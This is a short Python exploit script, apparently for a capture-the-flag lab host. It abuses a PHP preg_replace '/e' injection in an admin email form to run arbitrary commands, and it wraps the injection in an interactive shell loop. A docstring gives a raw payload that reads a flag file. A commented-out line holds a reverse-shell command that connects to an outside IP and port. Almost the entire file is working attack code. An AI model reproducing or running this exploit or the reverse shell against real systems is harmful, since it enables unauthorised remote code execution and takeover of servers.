'''
PHPSESSID=0q44jo82thetmi91dhc01cqke6
swearwords[/mal/e]=system('cat+a_flag_is_here.txt');&to=asd@asd&subject=asd&message=<p>mal</p>&_wysihtml5_mode=1
'''
from urllib import parse
from itsdangerous import base64_encode
import requests
from readline import get_completer_delims

URL = "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php"
COOKIE = {
    "PHPSESSID": "unc7p0s0esogeb9vcf8beu9hq3",
}
HEADER = {
    "Content-Type": "application/x-www-form-urlencoded",
}


def post_payload(url, cmd) -> str:
    payload = "swearwords[/mal/e]=system(base64_decode('%s'));&to=asd@asd&subject=asd&message=<p>mal</p>&_wysihtml5_mode=1"
    payload = payload % parse.quote_plus(base64_encode(cmd))
    r = requests.post(url,
                      data=payload,
                      cookies=COOKIE,
                      allow_redirects=False,
                      #proxies={"http": "http://localhost:8080"},
                      headers=HEADER,
                      )
    return r.text

def clean(text):
    text = text[1897:]
    # text = text[:text.find("<")]
    text = text[:-496]
    return text


while True:
    cmd = input("%> ")
    get_completer_delims()
    p = post_payload(URL, cmd)
    p = clean(p)
    print(p)

# cmd = "(ash -i >& /dev/tcp/10.13.14.9/4444 0>&1)2>&1"
# p = post_payload(URL, cmd)